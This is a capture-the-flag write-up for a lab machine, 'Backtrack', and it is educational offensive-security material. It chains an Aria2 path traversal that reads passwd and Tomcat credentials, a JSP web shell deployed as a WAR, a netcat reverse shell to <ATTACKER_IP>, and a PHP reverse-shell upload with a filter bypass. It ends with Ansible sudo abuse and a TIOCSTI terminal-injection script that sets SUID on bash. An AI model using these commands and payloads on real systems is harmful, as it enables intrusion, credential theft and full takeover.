# Enumeration

## \[+] 10.10.215.255 - back.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '10.10.215.255 back.thm' >> /etc/hosts
export RHOSTS=10.10.215.255
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 8888 - HTTP - Aria2 WebUI

### \[-] back.thm:8888

![7d35f011ef2abe34ca4274622d4a81da.png](/resources/b1659351e89b4ec2a9055de4a0cedbdc.png)

When we first visit this URL, the Aria2 WebUI is loaded and an error message is shown in the top right corner:

*"Successfully connected to Aria2 through remote RPC. however the connection is still insecure. For complete security try adding an authorization secret token while starting Aria2 (through the flag --rpc-secret)"*

We can find the version of Aria2 by hovering over the "Settings" menu and click the "Server Info" button:

![125bb748d2bf6dd40c8e4da365882927.png](/resources/22577709f0a44c259cd46f0c3c7548d4.png)

Searching for "Aria2 exploit" leads us to CVE-2023-39141 on [NIST](https://nvd.nist.gov/vuln/detail/CVE-2023-39141) and under the references, we will find a [GitHub](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e) page by JafarAkhondali which explains the path traversal vulnerability a bit more.

To exploit the path traversal vulnerability, we just need to make a `curl` request with the `--path-as-is` option then use `../` characters each time we want to move up a directory and the file we want to read. If we want to read the `passwd` file, we need to add enough `../` characters to read the root directory then `etc/passwd`:

```plaintext
curl --path-as-is http://back.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```

![40f8ce2b2f860d9e5f935f6c85253c04.png](/resources/3450853b5003497bb034857fa53d4287.png)

# Initial Foothold

## \[+] Port 8080 - HTTP - Apache Tomcat

### \[-] back.thm:8080

Now that we have a path traversal vulnerability on one of the server's applications, we can use it to read configuration files of other applications/services to our advantage.

On port 8080, we will find the default Apache Tomcat page:

![79cc89147fd1566e7a9f483dc5d65a7d.png](/resources/455b0a3bab494403a739a46c9c822056.png)

From the `passwd` file, we can find the `tomcat` user which has a home directory of `/opt/tomcat/`. Tomcat stores username and passwords in a plaintext file named `tomcat-users.xml` in the `conf` directory.

Let's make a `curl` request to read this file:

```plaintext
curl --path-as-is http://back.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
```

![e30aa96f1950e3227602355278203557.png](/resources/c897194b8c04498bbe317cf7580c1437.png)

Using these credentials, we can upload a web shell to the server. First, we have to create a file named `index.jsp` with the following Java code:

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Then we run the following command to package the file from JSP to WAR (make sure the directory only has the `index.jsp` file):

```plaintext
jar -cvf webshell.war *
```

Next, we'll upload the `webshell.war` file using `curl` and the credentials for `tomcat`:

```plaintext
curl --upload-file webshell.war -u tomcat:<TOMCAT_PASSWORD> 'http://back.thm:8080/manager/text/deploy?path=/webshell&update=true'
```

We can now interact with the webshell using `curl` with the URL `http://back.thm:8080/webshell/index.jsp?cmd=<COMMAND>` and the command we want to run:

```plaintext
curl -s 'http://back.thm:8080/webshell/index.jsp?cmd=id'
```

![adc465999727401e942bc9ab64c212e6.png](/resources/765d5e6f82224c628c8a2c972f9c43f6.png)

### \[-] tomcat\@Backtrack

Now that we have the ability to run commands on the server, we can upgrade from a web shell to a reverse shell.

First, start a Netcat listener:

```plaintext
nc -nvlp 4444
```

Next, we'll create a shell script with the reverse shell code with the filename `shell.sh`:

```sh
#!/usr/bin/env bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Then, host it using a Python HTTP server:

```plaintext
python3 -m http.server 8888
```

We can make a `curl` request to the web shell to download our `shell.sh` from our web server and save it to the `/tmp` directory on the victim machine:

```plaintext
curl -s 'http://back.thm:8080/webshell/index.jsp?cmd=curl+<ATTACKER_IP>:8888/shell.sh+-o+/tmp/shell.sh'
```

After the script has been downloaded, we'll run it on the victim machine using `bash`:

```plaintext
curl -s 'http://back.thm:8080/webshell/index.jsp?cmd=bash+/tmp/shell.sh'
```

Checking back to our Netcat listener, we should have a connection from the victim machine:

![b6e05913ab62b3560396eb4a582ceaf9.png](/resources/220dba2c1f4d44cd9a2cc04f17742abe.png)

Let's stablize our new shell:

1. Use Python to spawn a stable shell:

   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

2. `CTRL+Z` to background the current shell

3. Fix echoing and foregrounds the shell:

   ```sh
   stty raw -echo;fg
   ```

4. Set terminal to use 256 colors:

   ```sh
   export TERM=xterm-256color
   ```

# Privilege Escalation

### \[-] wilbur\@Backtrack

Running `sudo -l` we'll find that we are able to run any [Ansible playbook](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html) indicated by `/opt/test_playbooks/*.yml` as the user `wilbur`:

![1004c9a02556b18072f876f345540528.png](/resources/1365ae186d6e4f5f9ddac43a5b0fc8ea.png)

We can use this method from GTFObins to spawn a shell as `wilbur`. First we'll change our directory to `/opt/test_playbook/` then create a playbook named `shell.yml` in the `/tmp/` directory:

```plaintext
cd /opt/test_playbook/
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/shell.yml
```

After creating the file, we need to give it world permissions using `chmod`:

```plaintext
chmod 777 /tmp/shell.yml
```

When we run the playbook using `sudo` as `wilbur` there will be some warning messages, but eventually we will get a shell as `wilbur`:

```plaintext
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell.yml
id
```

![476ec4d8ddf71e3d7f29131949139f00.png](/resources/2474b68f7b514017abc8b01d410f13a5.png)

We can find the first flag by running the `find` command:

```plaintext
find / -type f -name flag1.txt 2>/dev/null
cat /opt/tomcat/flag1.txt
```

![91bb09d88e884d36d6e8b354a2135577.png](/resources/8a043c71bc5045adbe38f1f8cf297ae8.png)

Inside the `/home/wilbur/` directory we will find a note from `orville`:

![d5934f6ee2f0bfcaff2c39ea6754450c.png](/resources/e3f0e57d9a7741328b99fe4ff8fe906f.png)

There is also a hidden text file named `.just_in_case.txt` which contains the SSH credentials for the user `wilbur`:

![07705b80b2af498c319f2dbaf003e3a5.png](/resources/081923d9dbcf4385b6b1cd550047b2ab.png)

### \[-] orville\@Backtrack

Inside `from_orville.txt` we will find a note about a locally hosted web application along with the credentials to access it:

![1743aa046937dd7ef0d3d4c8737a309d.png](/resources/7a9126191b3644cab7d0ee701ab2d1bc.png)

We can check the current connections using `ss -tunlp`:

![9660313b011d7796cbefff378c0eea82.png](/resources/6a3a38df3c1b410ba38cf408c76c4d9b.png)

Using the SSH credentials, we use port forwarding to access the web application:

```plaintext
ssh wilbur@back.thm -L 8888:127.0.0.1:80
```

### \[-] localhost:8888

Now that we have an SSH tunnel set up, we can access the web application by navigating to `http://localhost:8888`:

![8dc5ea8a768c34a7e9011dc1b084910e.png](/resources/4ab3d36434414144949842c892ea7428.png)

After logging in, we have access to the file upload function of the image gallery:

![098344b15b9f338fab533d22cd202b68.png](/resources/def581b67a7a42528dff987d8018665c.png)

Let's start by testing the normal functionality of the application by uploading a test image:

![0df225e8feab497d3e64980e0e8235db.png](/resources/0bf5c24cd4ed40799297606886c41fda.png)

Right-clicking on the image and selecting "Open Image in New Tab" we will find the URL where the image was uploaded, `http://localhost:8888/uploads/test.jpg`.

Since this is a PHP web application, we can try to upload a [PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) but there is some filter in place so we get an error message:

![f9f5fdc719f90a310aae486d33ef358e.png](/resources/85980eca866e44cb8507d7804e96125d.png)

To bypass the filter, we can add the `.jpg` extension before `.php`, so the filename is `revshell.jpg.php`.

After uploading the reverse shell, we can go to `http://localhost:8888/uploads/` to find our PHP reverse shell:

![3736cdde2c87fe14e12de9212749b58e.png](/resources/1de1b0515c3a4ab1973b6a643812cdc7.png)

But, when we click on our PHP reverse shell it starts to download the file instead of executing the code.

If we check the Apache configuration file, we will find that the PHP engine is disabled for the filetypes `php`, `php3`, `php4`, `php5`, `phtml`, `phps`, `phar`, and `phpt` if the file is in the `/var/www/html/uploads` directory:

```plaintext
cat /etc/apache2/apache2.conf
```

![6d520ed1a42abded12fee7dbc95b4d1e.png](/resources/0754ac3a87584006a0fd8ba51dc4f147.png)

To get our PHP reverse shell to execute, we can use directory traversal again to save our script to `/var/www/html/`.

Let's first start up a Netcat listener:

```plaintext
nc -nvlp 4444
```

To modify our upload request I will be using [ZAProxy](https://www.zaproxy.org/). Begin by selecting `revshell.jpg.php` for upload again and then in ZAProxy, turn on "Set break on upon all responses and requests" then click the "Upload". ZAProxy will intercept the upload request and allow us to modify it.

Original request:

![08989fea16fc788a3aaf83ae35649cc5.png](/resources/73b12279c41a4dcbbd40b37ea0a77f34.png)

We will need to URL encode the `../` characters to bypass another filter, so our filename will now look like `%25%32%65%25%32%65%25%32%66revshell.jpg.php`:

![38e099e7c79a3e3a9eb0ec74f218cc60.png](/resources/c8c7cd62d2d948e5936df1aa9b925167.png)

After forwarding all the rest of the requests/responses we should have a connection back from the victim machine as `orville`:

![24170306d2cc2cd6c61e5c7e75932b59.png](/resources/cb17fb1c89de4275b2f7527974d4e19f.png)

Let's stablize our new shell:

1. Use Python to spawn a stable shell:

   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

2. `CTRL+Z` to background the current shell

3. Fix echoing and foregrounds the shell:

   ```sh
   stty raw -echo;fg
   ```

4. Set terminal to use 256 colors:

   ```sh
   export TERM=xterm-256color
   ```

We can find the second flag in `/home/orville/flag2.txt`:

![54a89d0b86f2fc02d6c522099df1bf63.png](/resources/156cd04212714c08921fae4a2f3fe7ab.png)

### \[-] root\@Backtrack

Also, inside `/home/orville/` we'll find another interesting file, `web_snapshot.zip`. We can unzip the file using `unzip web_snapshot.zip` where we will find our PHP reverse shell, `revshell.jpg.php` which means there is a backup system for the web application:

![bcf8f82bd87b5eef12d4ad584b3012d3.png](/resources/63fb9d5e89fc46258fc4d68f5683848d.png)

To find out what might be going on in the background processes, we can use the [pspy](https://github.com/DominicBreuker/pspy) tool by Dominic Breuker. After downloading `pspy64`, we can host it using a simple Python server:

```plaintext
python3 -m http.server 8889
```

Then download it onto the victim machine with `wget`, give it execute permissions using `chmod` and execute the application:

```plaintext
cd /tmp
wget <ATTACKER_IP>:8889/pspy64
chmod +x
./psyp64
```

After some time, we will see some interesting processes show up. First, there is an SSH connection as the `root` user and then a switch to the user `orville` using `su orville` so the ZIP command to backup the web application is done by `orville`:

![c6cd387f33a6edee0fcb5e5972ecd3cc.png](/resources/edae38db312542709f180956f2718388.png)

For additional security, when using the `su` command, you should add the `-P` flag to create a pseudo terminal for that session to avoid TTY Pushback/TIOCSTI ioctl terminal injection. Using `SIGSTOP` will switch focus from the low privilege shell and give us the root shell, but since we won't have access to that terminal session directly, we can set the SUID bit on `bash` which will give us permissions to escalate us to `root`.

First, we need to create a Python script that will do this for us. Save the script as `exploit.py` and use the simple HTTP server to trasfer it onto the victim machine to the `/dev/shm/` directory:

```python3
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

After the script has been transferred onto the victim machine, we can append a `pythone3` command to run the script to the `.bashrc` file which will run it automatically when the user logs in as `root` using SSH, then switches to `orville`:

```plaintext
echo 'python3 /dev/shm/exploit.py' >> /home/orville/.bashrc
```

After some time, we can check the permissions for `/bin/bash` and it should have the `s` bit set:

```plaintext
ls -lah /bin/bash
```

![e31b0185e4afdeee3d6a7110f35a08fe.png](/resources/c76f63b59f6d47dd89f6e20e158d3fa4.png)

Now when we run `/bin/bash` with the `-p` flag we will have an Effective User ID of `root`:

```plaintext
/bin/bash -p
id
```

![ff2a5e7568d9c1437c58413f0fc45b9b.png](/resources/13a20a0e480f4ea0bb2b979481871f9e.png)

We can find the last flag in `/root/flag3.txt`:

![0898f8f5e3833f657d4fca3f25a1e1ba.png](/resources/db8b567186574ad6a48a51cd1cdcc99c.png)
